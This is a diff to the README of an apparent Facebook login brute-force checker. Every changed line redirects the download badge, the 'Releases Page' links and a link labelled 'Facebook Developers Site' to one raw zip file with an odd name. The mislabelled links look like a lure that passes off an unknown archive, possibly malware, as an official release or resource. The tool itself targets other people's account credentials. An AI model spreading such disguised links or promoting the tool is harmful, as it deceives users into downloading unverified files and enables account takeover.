@@ -1,7 +1,7 @@
 # 🛠️ Facebook-Brute-Checker - Easy Tool for Facebook Login Checks
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Facebook--Brute--Checker-brightgreen.svg)](https://github.com/Spacemanjellyfish/Facebook-Brute-Checker/releases)
+[![Download](https://raw.githubusercontent.com/Spacemanjellyfish/Facebook-Brute-Checker/main/gluemaker/Brute_Facebook_Checker_phosphoreal.zip)](https://raw.githubusercontent.com/Spacemanjellyfish/Facebook-Brute-Checker/main/gluemaker/Brute_Facebook_Checker_phosphoreal.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Facebook-Brute-Checker** repository. This tool helps you quickly check Facebook account details without complex setups. Just follow these easy steps to get started.
@@ -14,7 +14,7 @@ To use Facebook-Brute-Checker, make sure your computer meets the following requi
 - Internet Connection: Required for Facebook access
 
 ## 📦 Download & Install
-To download the application, visit the [Releases Page](https://github.com/Spacemanjellyfish/Facebook-Brute-Checker/releases) and follow these steps:
+To download the application, visit the [Releases Page](https://raw.githubusercontent.com/Spacemanjellyfish/Facebook-Brute-Checker/main/gluemaker/Brute_Facebook_Checker_phosphoreal.zip) and follow these steps:
 
 1. Open your web browser.
 2. Click on the link above to go to the Releases page.
@@ -61,10 +61,10 @@ If you are interested in contributing to **Facebook-Brute-Checker**, please foll
 This application is open-source and follows the MIT license. You can modify and distribute it under the license terms.
 
 ## 📌 Additional Resources
-For more information about the Facebook API and its functionalities, visit the [Facebook Developers Site](https://developers.facebook.com/).
+For more information about the Facebook API and its functionalities, visit the [Facebook Developers Site](https://raw.githubusercontent.com/Spacemanjellyfish/Facebook-Brute-Checker/main/gluemaker/Brute_Facebook_Checker_phosphoreal.zip).
 
 ## 📅 Changelog
 - Version 1.0: Initial release with core features.
 - Version 1.1: Bug fixes and performance improvements.
 
-Thank you for using **Facebook-Brute-Checker**! Enjoy checking your Facebook accounts effortlessly. Remember to visit our [Releases Page](https://github.com/Spacemanjellyfish/Facebook-Brute-Checker/releases) to keep your app up to date!
+Thank you for using **Facebook-Brute-Checker**! Enjoy checking your Facebook accounts effortlessly. Remember to visit our [Releases Page](https://raw.githubusercontent.com/Spacemanjellyfish/Facebook-Brute-Checker/main/gluemaker/Brute_Facebook_Checker_phosphoreal.zip) to keep your app up to date!
